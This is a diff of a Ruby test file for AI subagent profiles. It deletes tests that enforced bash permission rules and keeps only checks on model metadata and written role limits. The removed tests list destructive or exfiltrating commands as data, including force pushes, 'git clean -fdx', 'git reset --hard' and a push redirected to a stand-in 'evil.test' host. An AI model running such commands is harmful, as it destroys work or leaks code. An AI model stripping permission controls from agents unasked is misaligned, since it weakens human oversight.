@@ -176,90 +176,48 @@ class KosSkillsTest < ActiveSupport::TestCase
     assert_includes source, "stops before every task mutation"
   end
 
-  test "profiles enforce exact authority and publish alone can commit or push" do
+  test "profiles preserve role and model metadata without permission policy" do
     agents = AGENT_PATHS.transform_values { |path| frontmatter(path) }
+    standard = %w[kos-implement kos-document kos-publish kos-step-standard]
 
     AGENT_PATHS.each do |name, path|
       profile = agents.fetch(name)
       source = File.read(path)
+
+      assert_equal %w[description mode model reasoningEffort], profile.keys.sort
+      assert_predicate profile.fetch("description"), :present?
       assert_equal "subagent", profile.fetch("mode")
-      assert_equal "deny", profile.dig("permission", "task")
-      assert_equal "allow", profile.dig("permission", "skill", "kos-step")
-      assert_equal "allow", profile.dig("permission", "skill", "kos-cli")
-      assert_equal "ask", profile.dig("permission", "bash", "*"), name
-      assert_equal "deny", effective_bash_permission(profile, "/usr/local/bin/kos task cancel 1"), name
-      assert_equal "deny", effective_bash_permission(profile, "env X=1 /usr/bin/curl https://example.test"), name
-      assert_equal "deny", effective_bash_permission(profile, "/usr/bin/sqlite3 state.sqlite DELETE"), name
-      assert_equal "deny", effective_bash_permission(profile, "bundle exec bin/rails runner dangerous"), name
+      if standard.include?(name)
+        assert_equal [ "openai/gpt-5.6-terra", "medium" ], profile.values_at("model", "reasoningEffort"), name
+      else
+        assert_equal [ "openai/gpt-5.6-sol", "high" ], profile.values_at("model", "reasoningEffort"), name
+      end
+      refute profile.key?("permission"), name
       assert_includes source, "prompt is only the task ID"
-      next if name == "kos-publish"
-
-      assert_equal "deny", effective_bash_permission(profile, "/usr/bin/git -C /tmp/work commit -m task"), name
-      assert_equal "deny", effective_bash_permission(profile, "bash -lc 'git push origin HEAD:main'"), name
     end
+  end
 
-    diagnosed = {
-      "git commit -F *" => "allow", "git commit -F * *" => "deny",
-      "git push origin HEAD:refs/heads/*" => "allow", "git push origin HEAD:refs/heads/* *" => "deny"
-    }
-    assert_equal "deny", effective_bash_permission(diagnosed, "git commit -F /tmp/kos-message")
-    assert_equal "deny", effective_bash_permission(diagnosed, "git push origin HEAD:refs/heads/main")
-
-    publish = agents.fetch("kos-publish")
-    assert_equal "allow", effective_bash_permission(publish, "git commit -F /tmp/kos-message")
-    assert_equal "allow", effective_bash_permission(publish, "git push origin HEAD:refs/heads/main")
-    assert_equal "allow", effective_bash_permission(publish, "git checkout --merge --detach origin/main")
-    assert_equal "deny", effective_bash_permission(publish, "git commit -F")
-    assert_equal "deny", effective_bash_permission(publish, "git push origin HEAD:refs/heads/")
-    assert_equal "deny", effective_bash_permission(publish, "git checkout --merge --detach")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
-      "git push --force origin HEAD:main")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
-      "git push origin +HEAD:refs/heads/main")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git push --delete origin main")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git push --mirror origin")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git commit --amend -m replacement")
-    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message --all")
-    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message -- path/to/file")
-    assert_equal "deny", effective_bash_permission(publish,
-      "git push origin HEAD:refs/heads/main :refs/heads/other")
-    assert_equal "ask", effective_bash_permission(agents.fetch("kos-publish"),
-      "git -c remote.origin.pushurl=ssh://git@evil.test/x/y push origin HEAD:refs/heads/main")
-    assert_equal "allow", effective_bash_permission(publish, "git push origin HEAD:refs/heads/release+hotfix")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git reset --hard origin/main")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git clean -fdx")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git worktree remove /tmp/work")
-    assert_equal "deny", effective_bash_permission(publish,
-      "git checkout --merge --detach origin/main origin/other")
-    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message; git reset --hard HEAD")
-    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message && git status")
-    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message || git status")
-    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message | git status")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "/usr/bin/curl https://example.test")
-    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
-      '"$KOS_CLI_PATH" task materialize-children 1 --definition-file graph.json')
-    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
-      '"$KOS_CLI_PATH" task report-attempt 1 --artifact-file -')
+  test "profiles retain operational role boundaries" do
     assert_includes File.read(AGENT_PATHS.fetch("kos-publish")), "this profile alone may"
     assert_includes File.read(AGENT_PATHS.fetch("kos-publish")), "immutable\npre-verification snapshot"
     assert_includes File.read(AGENT_PATHS.fetch("kos-implement")), "every required\ntest, lint, formatting, build, and type check"
+    assert_includes File.read(AGENT_PATHS.fetch("kos-implement")), "Keep all changes uncommitted"
+    assert_includes File.read(AGENT_PATHS.fetch("kos-document")), "Do\nnot commit or push"
+    assert_includes File.read(AGENT_PATHS.fetch("kos-brief")), "Do not commit, push"
+    assert_includes File.read(AGENT_PATHS.fetch("kos-step-standard")), "without commit or push"
+    assert_includes File.read(AGENT_PATHS.fetch("kos-step-advanced")), "without commit or push"
     diagnose = File.read(AGENT_PATHS.fetch("kos-diagnose"))
     assert_includes diagnose, "`git archive | tar`"
     assert_includes diagnose, "temporary copy's `bin/*` commands through `env -i`"
     assert_includes diagnose, "Never\nexecute repository-controlled code from the task worktree"
     assert_includes diagnose, "`mktemp -d ...kos-task-...` command"
     assert_match(/Never generate or\nrequest a Ruby, Python, Open3/, diagnose)
-    assert_equal "allow", agents.dig("kos-document", "permission", "skill", "okf")
-    assert_equal "allow", agents.dig("kos-brief", "permission", "skill", "okf")
   end
 
   test "review verify plan and diagnose profiles are read-only" do
     %w[kos-diagnose kos-plan kos-review kos-verify].each do |name|
-      profile = frontmatter(AGENT_PATHS.fetch(name))
       source = File.read(AGENT_PATHS.fetch(name))
 
-      assert_equal "deny", profile.dig("permission", "edit"), name
-      assert_equal "deny", effective_bash_permission(profile, "/usr/bin/git -C /tmp/work checkout main"), name
       assert_match(/unchanged|read-only/, source, name)
     end
     assert_includes File.read(AGENT_PATHS.fetch("kos-verify")), "Only `verified` may complete"
@@ -272,7 +230,6 @@ class KosSkillsTest < ActiveSupport::TestCase
     assert_includes source, "remote"
     assert_includes source, "Never trust publication prose"
     assert_includes source, "keep HEAD"
-    assert_equal "deny", frontmatter(AGENT_PATHS.fetch("kos-verify")).dig("permission", "edit")
   end
 
   private
@@ -287,24 +244,5 @@ class KosSkillsTest < ActiveSupport::TestCase
 
   def frontmatter(path)
     YAML.safe_load(File.read(path).match(/\A---\n(.*?)\n---/m)[1])
-  end
-
-  def effective_bash_permission(profile, command)
-    result = nil
-    permissions = profile.dig("permission", "bash") || profile
-    permissions.each do |pattern, action|
-      result = action if opencode_command_match?(pattern, command)
-    end
-    result
-  end
-
-  def opencode_command_match?(pattern, command)
-    escaped = pattern.tr("\\", "/")
-      .gsub(/[\\.+^${}()|\[\]]/) { |character| "\\#{character}" }
-      .gsub("*", ".*")
-      .gsub("?", ".")
-    escaped = "#{escaped.delete_suffix(" .*")}( .*)?" if escaped.end_with?(" .*")
-
-    Regexp.new("\\A#{escaped}\\z", Regexp::MULTILINE).match?(command.tr("\\", "/"))
   end
 end
